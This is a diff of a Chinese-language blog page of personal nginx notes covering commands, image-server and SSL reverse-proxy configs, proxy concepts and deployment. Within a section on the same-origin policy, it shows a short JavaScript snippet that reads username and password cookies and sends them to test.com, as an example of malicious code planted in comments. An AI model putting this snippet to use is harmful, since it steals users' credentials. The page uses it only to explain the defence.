@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="installhttps:&#x2F;&#x2F;www.digitalocean.com&#x2F;community&#x2F;tutorials&#x2F;how-to-install-nginx-on-ubuntu-20-04 请求转发、反向代理、负载均衡 command1nginx -s (signal)    123nginx -s quitnginx -s stopnginx -s reload  Ps: 有时需要把进程杀死后才能r">
+  <meta name="description" content="installhttps:&#x2F;&#x2F;www.digitalocean.com&#x2F;community&#x2F;tutorials&#x2F;how-to-install-nginx-on-ubuntu-20-04 请求转发、反向代理、负载均衡 command1nginx -s (signal) 123nginx -s quitnginx -s stopnginx -s reload Ps: 有时需要把进程杀死后才能reloa">
 <meta property="og:type" content="article">
 <meta property="og:title" content="nginx">
 <meta property="og:url" content="http://example.com/2022/04/28/nginx/index.html">
 <meta property="og:site_name" content="藏经阁">
-<meta property="og:description" content="installhttps:&#x2F;&#x2F;www.digitalocean.com&#x2F;community&#x2F;tutorials&#x2F;how-to-install-nginx-on-ubuntu-20-04 请求转发、反向代理、负载均衡 command1nginx -s (signal)    123nginx -s quitnginx -s stopnginx -s reload  Ps: 有时需要把进程杀死后才能r">
+<meta property="og:description" content="installhttps:&#x2F;&#x2F;www.digitalocean.com&#x2F;community&#x2F;tutorials&#x2F;how-to-install-nginx-on-ubuntu-20-04 请求转发、反向代理、负载均衡 command1nginx -s (signal) 123nginx -s quitnginx -s stopnginx -s reload Ps: 有时需要把进程杀死后才能reloa">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20230201094007070.png">
 <meta property="og:image" content="c:/Users/10201/AppData/Roaming/Typora/typora-user-images/image-20230201141025695.png">
@@ -233,11 +233,7 @@
         <h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-20-04">https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-20-04</a></p>
 <p>请求转发、反向代理、负载均衡</p>
 <h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s (signal)</span><br></pre></td></tr></table></figure>
-
-
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx -s quit</span><br><span class="line">nginx -s stop</span><br><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>
-
 <p>Ps: 有时需要把进程杀死后才能reload</p>
 <h2 id="简单的图片服务器"><a href="#简单的图片服务器" class="headerlink" title="简单的图片服务器"></a>简单的图片服务器</h2><p>默认资源文件夹：<code>/var/www/html</code></p>
 <p>可自定义</p>
@@ -245,21 +241,7 @@
 <p>在http模块下配置一个server即可</p>
 <p>nginx.conf</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 768;</span><br><span class="line">	# multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Basic Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	sendfile on;</span><br><span class="line">	tcp_nopush on;</span><br><span class="line">	tcp_nodelay on;</span><br><span class="line">	keepalive_timeout 65;</span><br><span class="line">	types_hash_max_size 2048;</span><br><span class="line">	# server_tokens off;</span><br><span class="line"></span><br><span class="line">	# server_names_hash_bucket_size 64;</span><br><span class="line">	# server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">	include /etc/nginx/mime.types;</span><br><span class="line">	default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# SSL Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">	ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Logging Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	access_log /var/log/nginx/access.log;</span><br><span class="line">	error_log /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Gzip Settings</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	gzip on;</span><br><span class="line"></span><br><span class="line">	# gzip_vary on;</span><br><span class="line">	# gzip_proxied any;</span><br><span class="line">	# gzip_comp_level 6;</span><br><span class="line">	# gzip_buffers 16 8k;</span><br><span class="line">	# gzip_http_version 1.1;</span><br><span class="line">	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class="line"></span><br><span class="line">	##</span><br><span class="line">	# Virtual Host Configs</span><br><span class="line">	##</span><br><span class="line"></span><br><span class="line">	include /etc/nginx/conf.d/*.conf;</span><br><span class="line">	include /etc/nginx/sites-enabled/*;</span><br><span class="line">	server&#123;</span><br><span class="line">		listen 80;</span><br><span class="line">		server_name localhost;</span><br><span class="line">		location  ~ .*\.(gif|jpg|jpeg|png)$ &#123;</span><br><span class="line">			root /home/cola/Downloads/;</span><br><span class="line">		&#125;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#mail &#123;</span><br><span class="line">#	# See sample authentication script at:</span><br><span class="line">#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class="line"># </span><br><span class="line">#	# auth_http localhost/auth.php;</span><br><span class="line">#	# pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class="line">#	# imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class="line"># </span><br><span class="line">#	server &#123;</span><br><span class="line">#		listen     localhost:110;</span><br><span class="line">#		protocol   pop3;</span><br><span class="line">#		proxy      on;</span><br><span class="line">#	&#125;</span><br><span class="line"># </span><br><span class="line">#	server &#123;</span><br><span class="line">#		listen     localhost:143;</span><br><span class="line">#		protocol   imap;</span><br><span class="line">#		proxy      on;</span><br><span class="line">#	&#125;</span><br><span class="line">#&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
 <h2 id="配置SSL"><a href="#配置SSL" class="headerlink" title="配置SSL"></a>配置SSL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen              80;</span><br><span class="line">    server_name         120.24.111.127 homework.culiu-tech.com;</span><br><span class="line">    rewrite ^(.*)$ https://homework.culiu-tech.com permanent;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen              443 ssl;</span><br><span class="line">    server_name         homework.culiu-tech.com;</span><br><span class="line">    ssl_certificate      &#x27;/etc/nginx/certification/9462160_homework.culiu-tech.com.pem&#x27;;</span><br><span class="line">    ssl_certificate_key  &#x27;/etc/nginx/certification/9462160_homework.culiu-tech.com.key&#x27;;</span><br><span class="line">    location / &#123;</span><br><span class="line">       #some setting of moodle is in /yjdata/www/wwwroot/config.php</span><br><span class="line">        proxy_pass      https://172.18.91.248:81;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
 <h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p><code>客户端client</code>与<code>代理服务器proxy</code>处于同一个局域网，就是正向代理<br><code>服务器server</code>与<code>代理服务器proxy</code>处于同一局域网，就是反向代理</p>
 <ul>
 <li>正向代理是代理客户端</li>
@@ -282,8 +264,7 @@
 <p>有用户在评价里写了恶意代码</p>
 <p>那么，在其他用户浏览评论的时候就完蛋了</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> username=CookieHelper.getCookie(<span class="string">&#x27;username&#x27;</span>).value;</span><br><span class="line"><span class="keyword">var</span> password=CookieHelper.getCookie(<span class="string">&#x27;password&#x27;</span>).value;</span><br><span class="line"><span class="keyword">var</span> script =<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.src=<span class="string">&#x27;http://test.com/index.php?username=&#x27;</span>+username+<span class="string">&#x27;&amp;password=&#x27;</span>+password;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure>
-
-<p>几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://test.com/index.php">http://test.com/index.php</a></p>
+<p>几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http%3A%2F%2Ftest.com%2Findex.php">http://test.com/index.php</a></p>
 <p>发送了一个get请求</p>
 <p>如果有了同源策略的话，这个请求就发不出去</p>
 <p>防止了密码的泄露</p>
@@ -302,13 +283,8 @@
 <p>资源文件夹：<code>/var/www/html</code></p>
 <p>简单部署就安装了简易版的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx-light</span><br></pre></td></tr></table></figure>
-
-
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">       listen 8080;</span><br><span class="line">       location / &#123;</span><br><span class="line">         root   /var/www/html/dist/;</span><br><span class="line">         try_files $uri $uri/ /index.html;</span><br><span class="line">        &#125;</span><br><span class="line">        location /api &#123;</span><br><span class="line">          proxy_pass http://40.72.185.138:8082/;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
-
 <p>root 为dis解压后的目录</p>
 <p>proxy_pass 是后端api的地址</p>
 <p>第二个location的意思是</p>
@@ -316,22 +292,9 @@
 <p>转到40.72.185.138:8082/</p>
 <p>Ps：8082后加不加斜杠，取决于vue里面怎么拼接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!qa # 不保存退出vi</span><br></pre></td></tr></table></figure>
-
-
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure>
-
-
-
 <p>卸载nginx</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove nginx nginx-common</span><br><span class="line">sudo apt-get purge nginx nginx-common</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">sudo apt-get remove nginx-full nginx-common</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
 
     </div>
 
